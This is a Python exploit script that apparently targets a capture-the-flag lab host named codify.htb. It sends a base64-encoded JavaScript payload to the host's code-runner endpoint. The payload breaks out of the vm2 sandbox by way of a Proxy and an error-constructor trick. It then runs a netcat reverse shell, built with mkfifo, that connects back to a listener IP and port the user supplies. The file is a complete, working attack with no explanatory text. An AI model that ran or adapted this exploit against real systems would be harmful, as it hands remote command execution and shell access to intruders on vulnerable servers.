
import requests
import json
import base64

def send_request(host, payload, ip, port):
    
    print('Host Alive ? .. Verifying..\n')
    r = requests.get(host)
    
    if r.status_code != 200:
        print('Host is dead... Exiting')
        exit(1)
    else:
        print('Host is alive.. Proceeding')

    headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": host,
        "Referer": f"{host}/editor",
    }

    payload = payload.replace('{ip}', ip).replace('{port}', port)
    code = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    data = json.dumps({"code": code})
    response = requests.post(f"{host}/run", headers=headers, data=data)
    return response.json()



def payload():
    payld = """
    const {VM} = require("vm2");
    const vm = new VM();

    const code = `
    err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f');
    }
    `;

    console.log(vm.run(code));
    """
    return payld


if __name__ == "__main__":
    ip = input('Listening IP address:>   ')
    port = input('Listening Port:>   ')
    host = 'http://codify.htb'
    response = send_request(host, payload(), ip, port)

    print(response)
